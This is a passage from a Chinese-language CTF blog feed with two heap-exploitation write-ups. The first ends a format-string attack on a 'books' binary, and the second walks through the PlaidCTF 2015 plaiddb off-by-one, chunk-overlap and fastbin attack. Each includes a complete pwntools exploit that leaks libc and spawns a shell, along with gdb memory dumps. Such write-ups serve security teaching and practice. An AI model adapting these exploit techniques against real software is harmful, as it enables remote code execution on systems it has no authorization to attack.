<p><a href="https://luomuxiaoxiao.com/?p=516" target="_blank" rel="noopener">linux_x86程序启动中文版</a><br><a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html" target="_blank" rel="noopener">linux_x86程序启动英文版</a><br>这两篇文章一样的，不过一个中文版，一个英文版，建议英文好的同学读原版，因为.fini在exit前会进行调用，所以修改后能执行多一次main函数</p>
<ol start="9">
<li>这时候发觉泄露出libc后不知道修改哪个函数了，因为调用printf后再也没函数用了，这时候思路又断了</li>
<li>所以这时候想想别的办法，发觉栈上存了一个与存main函数返回地址的指针存在一定偏移的地址，所以泄露出来后，在减掉那个固定偏移就可以修改main函数返回地址了</li>
</ol>
<p>注意：这里格式化字符串内容存在堆里，指针存在栈上，所以我们fgets输入的才是对应上的偏移</p>
<h3 id="1-2-4-exp"><a href="#1-2-4-exp" class="headerlink" title="1.2.4. exp"></a>1.2.4. exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'books'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'books'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    p = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    No RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span> :</span></span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvregex(<span class="string">r'''Enter (.*?) order:\n'''</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span> :</span></span><br><span class="line">    p.sendline(str(idx+<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(content)</span> :</span></span><br><span class="line">    p.sendline(<span class="string">'5'</span>+ <span class="string">'\x00'</span>*<span class="number">7</span> + content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    fini_array = <span class="number">0x6011B8</span></span><br><span class="line">    main_addr = <span class="number">0x400A39</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#first step </span></span><br><span class="line">    <span class="comment">#leak</span></span><br><span class="line">    fmstr = <span class="string">"%&#123;&#125;c%&#123;&#125;$hnQ%&#123;&#125;$pP%&#123;&#125;$p"</span>.format(<span class="number">0xA39</span>, <span class="number">13</span>, <span class="number">31</span>, <span class="number">28</span>)</span><br><span class="line">    payload = fmstr.ljust(<span class="number">0x74</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x88</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x151</span>)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    <span class="comment">#offset=13</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    submit(p64(fini_array))</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        p.recvuntil(<span class="string">'Q'</span>)</span><br><span class="line">    __libc_start_main_addr = int(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">    libc_base = __libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]<span class="number">-240</span></span><br><span class="line">    ret_addr = int(p.recv(<span class="number">15</span>)[<span class="number">1</span>:], <span class="number">16</span>)<span class="number">-0x1e8</span></span><br><span class="line">    one_gadget_offset = <span class="number">0x45216</span> </span><br><span class="line">    <span class="comment">#one_gadget_offset = 0x4526a </span></span><br><span class="line">    <span class="comment">#one_gadget_offset = 0xf02a4</span></span><br><span class="line">    <span class="comment">#one_gadget_offset = 0xf1147</span></span><br><span class="line">    one_gadget = libc_base + one_gadget_offset</span><br><span class="line">    p.success(<span class="string">"libc_base-&gt; 0x%x"</span> % libc_base)</span><br><span class="line">    p.success(<span class="string">"ret_addr-&gt; 0x%x"</span> % ret_addr)</span><br><span class="line">    p.success(<span class="string">"one_gadget-&gt; 0x%x"</span> % one_gadget)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#second step</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    part1 = ((one_gadget&gt;&gt;<span class="number">16</span>)&amp; <span class="number">0xffff</span>)</span><br><span class="line">    part2 = (one_gadget &amp; <span class="number">0xffff</span>)</span><br><span class="line"></span><br><span class="line">    part =[</span><br><span class="line">        (part1, p64(ret_addr+<span class="number">2</span>)),</span><br><span class="line">        (part2, p64(ret_addr))</span><br><span class="line">    ]</span><br><span class="line">    part.sort(key=<span class="keyword">lambda</span> tup: tup[<span class="number">0</span>])</span><br><span class="line">    size = [i[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> part]</span><br><span class="line">    addr =<span class="string">''</span>.join(x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> part)</span><br><span class="line">    print(size)</span><br><span class="line">    print(addr)</span><br><span class="line">    fmstr = <span class="string">"%&#123;&#125;c%&#123;&#125;$hn"</span>.format(size[<span class="number">0</span>], <span class="number">13</span>)</span><br><span class="line">    fmstr += <span class="string">"%&#123;&#125;c%&#123;&#125;$hn"</span>.format(size[<span class="number">1</span>]-size[<span class="number">0</span>], <span class="number">14</span>)</span><br><span class="line">    payload = fmstr.ljust(<span class="number">0x74</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x88</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x151</span>)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    <span class="comment">#offset=13</span></span><br><span class="line">    submit(addr)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="1-3-总结"><a href="#1-3-总结" class="headerlink" title="1.3. 总结"></a>1.3. 总结</h2><ol>
<li>这道题堆部分难点部分想到了就不难，没想到就难，就是要利用那个部分溢出到第三个堆块</li>
<li>其余部分就全是格式化字符串的利用了，没什么好讲的</li>
<li>这道题拿到shell也偏废时间，最主要直接看exp我看不懂，后面去看文章才看懂的</li>
</ol>
<h2 id="1-4-参考链接"><a href="#1-4-参考链接" class="headerlink" title="1.4. 参考链接"></a>1.4. 参考链接</h2><p><a href="https://bbs.pediy.com/thread-246783.htm" target="_blank" rel="noopener">看雪大佬的文章</a></p>
]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程2</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程2"><a href="#pwn堆入门系列教程2" class="headerlink" title="pwn堆入门系列教程2"></a>pwn堆入门系列教程2</h1><p><a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">堆入门系列教程1</a><br>序言：第二题，研究了两天，其中有小猪师傅，m4x师傅，萝卜师傅等各个师傅指点我，这次又踩了几个坑，相信以后不会再犯，第二题感觉比第一题复杂许多，不是off-by-one的问题，是这种攻击方式的问题，这种攻击方式十分精妙，chunk overlap，堆块重叠，这种攻击方式我也是第一次见，复现起来难度也是有滴</p><a id="more"></a>
<h2 id="off-by-one第二题"><a href="#off-by-one第二题" class="headerlink" title="off-by-one第二题"></a>off-by-one第二题</h2><p>此题也是off-by-one里的一道题目，让我再次意识到off by one在堆里的强大之处</p>
<h2 id="plaidctf-2015-plaiddb"><a href="#plaidctf-2015-plaiddb" class="headerlink" title="plaidctf 2015 plaiddb"></a>plaidctf 2015 plaiddb</h2><p>前面的功能分析和数据结构分析我就不再做了，ctf-wiki上给的清楚了，然后网上各种wp也给的清楚了，我没逆向过红黑树，也没写过，所以具体结构我也不清楚，照着师傅们的来，确实是树</p>
<p>数据结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *key;</span><br><span class="line">    <span class="keyword">long</span> data_size;</span><br><span class="line">    <span class="keyword">char</span> *data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">right</span>;</span></span><br><span class="line">    <span class="keyword">long</span> dummy;</span><br><span class="line">    <span class="keyword">long</span> dummy1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数存在off-by-one</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">sub_1040</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// bp</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">malloc</span>(<span class="number">8u</span>LL);</span><br><span class="line">  v1 = v0;</span><br><span class="line">  v2 = malloc_usable_size(v0);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">    v4 = v3;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">-1</span> )</span><br><span class="line">      sub_1020();</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = v1 - v0;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= v1 - v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="built_in">realloc</span>(v0, <span class="number">2</span> * v2);</span><br><span class="line">      v0 = v6;</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"FATAL: Out of memory"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v1 = &amp;v6[v5];</span><br><span class="line">      v2 = malloc_usable_size(v6);</span><br><span class="line">    &#125;</span><br><span class="line">    *v1++ = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  *v1 = <span class="number">0</span>;<span class="comment">//off-by-one</span></span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后师傅们利用堆块的重叠进行泄露地址，然后覆盖fd指针，然后fastbin attack，简单的说就是这样，先说明下整体攻击过程</p>
<ol>
<li>先删掉初始存在的堆块 th3fl4g，方便后续堆的布置及对齐</li>
<li>创建堆块，为后续做准备在创建同key堆块的时候，会删去上一个同key堆块</li>
<li>利用off-by-one覆盖下个chunk的pre_size，这里必须是0x18,0x38,0x78这种递增的，他realloc是按倍数递增的，如果我们用了0x18大小的key的话，会将下一个chunk的pre_size部分当数据块来用，在加上off-by-one覆盖掉size的insue位</li>
<li>先free掉第一块，为后续大堆块做准备</li>
<li>然后free第三块，这时候会向后合并堆块，根据pre_size合并成大堆块造成堆块重叠，这时候可以泄露地址了</li>
<li>申请堆块填充空间至chunk2</li>
<li>chunk2上为main_arena，泄露libc地址</li>
<li>现在堆块是重叠的，chunk3在我们free后的大堆块里，然后修改chunk3的fd指针指向realloc_hook</li>
<li>不破坏现场(不容易)</li>
<li>malloc一次，在malloc一次，这里有个点要注意，需要错位伪造size，因为fastbin有个checksize，我们这里将前面的0x7f错位，后面偏移也要补上</li>
<li>最后改掉后，在调用一次getshell</li>
</ol>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'datastore'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = ctx.start()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e.args)</span><br><span class="line">        print(<span class="string">"It can't work,may be it can't load the remote libc!"</span>)</span><br><span class="line">        print(<span class="string">"It will load the local process"</span>)</span><br><span class="line">        io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="comment"># FORTIFY:  Enabled</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(key)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"GET"</span>)</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PUT</span><span class="params">(key, size, data)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"PUT"</span>)</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter data size:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter data:"</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DUMP</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"DUMP"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DEL</span><span class="params">(key)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"DEL"</span>)</span><br><span class="line">    p.recvline(<span class="string">"PROMPT: Enter row key:"</span>)</span><br><span class="line">    p.sendline(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">    system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    realloc_hook_off = libc.symbols[<span class="string">'__realloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">    DEL(<span class="string">"th3fl4g"</span>)</span><br><span class="line"></span><br><span class="line">    PUT(<span class="string">"1"</span>*<span class="number">0x8</span>, <span class="number">0x80</span>, <span class="string">'A'</span>*<span class="number">0x80</span>)</span><br><span class="line">    PUT(<span class="string">"2"</span>*<span class="number">0x8</span>, <span class="number">0x18</span>, <span class="string">'B'</span>*<span class="number">0x18</span>)</span><br><span class="line">    PUT(<span class="string">"3"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, <span class="string">'C'</span>*<span class="number">0x60</span>)</span><br><span class="line">    PUT(<span class="string">"3"</span>*<span class="number">0x8</span>, <span class="number">0xf0</span>, <span class="string">'C'</span>*<span class="number">0xf0</span>)</span><br><span class="line">    PUT(<span class="string">"4"</span>*<span class="number">0x8</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x200</span>), <span class="number">0x20</span>, <span class="string">'D'</span>*<span class="number">0x20</span>)  <span class="comment"># off by one</span></span><br><span class="line"></span><br><span class="line">    DEL(<span class="string">"1"</span>*<span class="number">0x8</span>)</span><br><span class="line">    DEL(<span class="string">"3"</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">    PUT(<span class="string">"a"</span>, <span class="number">0x88</span>, p8(<span class="number">0</span>)*<span class="number">0x88</span>)</span><br><span class="line">    DUMP()</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"INFO: Dumping all rows.\n"</span>)</span><br><span class="line">    temp = p.recv(<span class="number">11</span>)</span><br><span class="line">    heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))<span class="number">-0x3f0</span></span><br><span class="line">    libc_base = int(p.recvline()[<span class="number">3</span>:<span class="number">-7</span>])<span class="number">-0x3be7b8</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line">    log.info(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">    realloc_hook_addr = libc_base + realloc_hook_off</span><br><span class="line">    log.info(<span class="string">"reallo_hook: 0x%x"</span> % realloc_hook_addr)</span><br><span class="line">    payload = p64(heap_base+<span class="number">0x70</span>)</span><br><span class="line">    payload += p64(<span class="number">0x8</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x50</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    payload += p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x3e0</span>)</span><br><span class="line">    payload += p64(<span class="number">0x88</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0xb0</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    payload += p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x71</span>)</span><br><span class="line">    payload += p64(realloc_hook_addr<span class="number">-0x8</span><span class="number">-0x3</span><span class="number">-0x8</span>)</span><br><span class="line">    PUT(<span class="string">"6"</span>*<span class="number">0x8</span>, <span class="number">0xa8</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x41</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x290</span>)</span><br><span class="line">    payload += p64(<span class="number">0x20</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x3b0</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">    PUT(<span class="string">"c"</span>*<span class="number">0x8</span>, <span class="number">0x78</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x90</span>)</span><br><span class="line">    payload += p64(<span class="number">0x8</span>)+p64(heap_base+<span class="number">0x230</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">    payload += p64(<span class="number">0x1</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">    PUT(<span class="string">"d"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, payload)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    system_addr = libc_base+system_off</span><br><span class="line">    print(<span class="string">"system_addr: 0x%x"</span> % system_addr)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x3</span></span><br><span class="line">    payload += p64(system_addr)</span><br><span class="line">    payload += p8(<span class="number">0</span>)*(<span class="number">0x4d</span>+<span class="number">0x8</span>)</span><br><span class="line">    PUT(<span class="string">"e"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, payload)</span><br><span class="line">    payload = <span class="string">"/bin/sh"</span></span><br><span class="line">    payload += p8(<span class="number">0</span>)*<span class="number">0x12</span> </span><br><span class="line">    GET(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="细节讲解"><a href="#细节讲解" class="headerlink" title="细节讲解"></a>细节讲解</h3><p>我只有exp部分是重点，其余创建堆块动作都是辅助的</p>
<h4 id="堆块重叠"><a href="#堆块重叠" class="headerlink" title="堆块重叠"></a>堆块重叠</h4><p><a href="http://4ngelboy.blogspot.com/2016/10/span-display-block-overflow-hidden_10.html" target="_blank" rel="noopener">堆叠</a><br>这篇文章讲的很好，图配的也很好，看下这部分就大概知道堆块重叠了<br>而这道题中，这里就是构造堆块重叠部分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">realloc_hook_off = libc.symbols[<span class="string">'__realloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">DEL(<span class="string">"th3fl4g"</span>)</span><br><span class="line"></span><br><span class="line">PUT(<span class="string">"1"</span>*<span class="number">0x8</span>, <span class="number">0x80</span>, <span class="string">'A'</span>*<span class="number">0x80</span>)</span><br><span class="line">PUT(<span class="string">"2"</span>*<span class="number">0x8</span>, <span class="number">0x18</span>, <span class="string">'B'</span>*<span class="number">0x18</span>)</span><br><span class="line">PUT(<span class="string">"3"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, <span class="string">'C'</span>*<span class="number">0x60</span>)</span><br><span class="line">PUT(<span class="string">"3"</span>*<span class="number">0x8</span>, <span class="number">0xf0</span>, <span class="string">'C'</span>*<span class="number">0xf0</span>)</span><br><span class="line">PUT(<span class="string">"4"</span>*<span class="number">0x8</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x200</span>), <span class="number">0x20</span>, <span class="string">'D'</span>*<span class="number">0x20</span>)  <span class="comment"># off by one</span></span><br><span class="line"></span><br><span class="line">DEL(<span class="string">"1"</span>*<span class="number">0x8</span>)</span><br><span class="line">DEL(<span class="string">"3"</span>*<span class="number">0x8</span>)</span><br></pre></td></tr></table></figure>
<h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PUT(<span class="string">"a"</span>, <span class="number">0x88</span>, p8(<span class="number">0</span>)*<span class="number">0x88</span>)</span><br><span class="line">DUMP()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"INFO: Dumping all rows.\n"</span>)</span><br><span class="line">temp = p.recv(<span class="number">11</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))<span class="number">-0x3f0</span></span><br><span class="line">libc_base = int(p.recvline()[<span class="number">3</span>:<span class="number">-7</span>])<span class="number">-0x3be7b8</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line">log.info(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">realloc_hook_addr = libc_base + realloc_hook_off</span><br><span class="line">log.info(<span class="string">"reallo_hook: 0x%x"</span> % realloc_hook_addr)</span><br></pre></td></tr></table></figure>
<p>第一步put是为了将free掉的chunk移动到2处，这样才好泄露</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x562a3c9a8070-0x70</span><br><span class="line">0x562a3c9a8000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x562a3c9a8010:	0x0000000000000000	0x0000000000000080</span><br><span class="line">0x562a3c9a8020:	0x0000562a3c9a80b0	0x0000000000000000</span><br><span class="line">0x562a3c9a8030:	0x0000000000000000	0x0000562a3c9a8140</span><br><span class="line">0x562a3c9a8040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x562a3c9a8050:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x562a3c9a8060:	0x4242424242424242	0x0000000000000021</span><br><span class="line">0x562a3c9a8070:	0x3232323232323232	0x0000000000000000</span><br><span class="line">0x562a3c9a8080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x562a3c9a8090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562a3c9a80a0:	0x0000000000000000	0x0000000000000301 <span class="comment">#free后合并的chunk</span></span><br><span class="line">0x562a3c9a80b0:	0x00007f14e88247b8	0x00007f14e88247b8</span><br><span class="line">0x562a3c9a80c0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a80d0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a80e0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a80f0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a8100:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a8110:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a8120:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a8130:	0x0000000000000090	0x0000000000000040 <span class="comment">#堆块2</span></span><br><span class="line">0x562a3c9a8140:	0x0000562a3c9a8070	0x0000000000000018</span><br><span class="line">0x562a3c9a8150:	0x0000562a3c9a8050	0x0000000000000000</span><br><span class="line">0x562a3c9a8160:	0x0000000000000000	0x0000562a3c9a8250</span><br><span class="line">0x562a3c9a8170:	0x0000000000000001	0x0000000000000041</span><br><span class="line">0x562a3c9a8180:	0x0000562a3c9a8000	0x00000000000000f0</span><br></pre></td></tr></table></figure>
<ol>
<li>为什么确定这里是堆块2，你可以看他的key指针，指向0x0000562a3c9a8070，这里正是0x32就是第二块</li>
<li>如果我们要泄露的话，就是通过覆盖堆块的数据部分的大小，也就是0x18那个大小，覆盖成0x562a3c9a80b0处存的地址，我们要将这个内容往下偏移多少要计算下</li>
<li>0x562a3c9a8140-0x562a3c9a80b0=0x90</li>
<li>所以我们下一个malloc的大小就是0x80-0x90之间了,不能是0x90，否则会变成0x100的chunk</li>
</ol>
<p>覆盖后结果如下，地址会变，因为我是两次调试，方便截图，实际偏移位置没变</p>
